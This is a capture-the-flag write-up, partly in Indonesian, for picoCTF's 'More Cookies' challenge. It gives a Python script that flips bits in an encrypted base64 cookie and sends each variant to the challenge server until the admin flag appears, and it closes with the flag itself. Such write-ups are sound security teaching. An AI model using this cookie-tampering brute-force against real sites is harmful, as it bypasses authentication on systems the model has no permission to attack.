<h1>More Cookies</h1>
<p>I forgot Cookies can Be modified Client-side, so now I decided to encrypt them! http://mercury.picoctf.net:34962/</p>
<p>Hint :</p>
<ul>
<li>https://en.wikipedia.org/wiki/Homomorphic_encryption</li>
<li>The search endpoint is only helpful for telling you if you are admin or not, you won't be able to guess the flag name</li>
</ul>
<h3>Solution</h3>

<p> Homomorphic yaitu mengganti bit peran yang sudah ter-encrypt dan menjadi pesan lain dalam bentuk decryptnya</p>

```python3
import base64
import requests


def bruteforce(i,j,dec):
    data = [n for n in dec]
    data[i] = data[i]^j
    raw = ''.join([chr(n) for n in data])
    return base64.b64encode(raw.encode('utf8'))

url = 'http://mercury.picoctf.net:34962/'
encode = 'RkVBc3ZhQWZLdHVsdzdYQU16Zzk4c25qRmtCS3BrYzVka3BwcFAwWGphSUFNRUtXRG11VE4wTVVHQ0syNmlSbzdlSmpyU3d1SkQ5STJRZUNJUkZ0RDBqY2l5Z3Z5bnlrNEVFZklvelN5UzRlN25naWNSM3FLeGFkNzVGT1NwM0Q='

dec = base64.b64decode(encode.encode('utf8'))
for i in range(128):
    for j in range(128):
        hasil = bruteforce(i,j,dec)
        cookies = {'auth_name':hasil.decode('ascii')}
        res = requests.get(url,cookies=cookies).text
        if "picoCTF{" in res:
            print(res)
```

<h3>Flag</h3>
<p>picoCTF{cO0ki3s_yum_e40d16a9}</p>
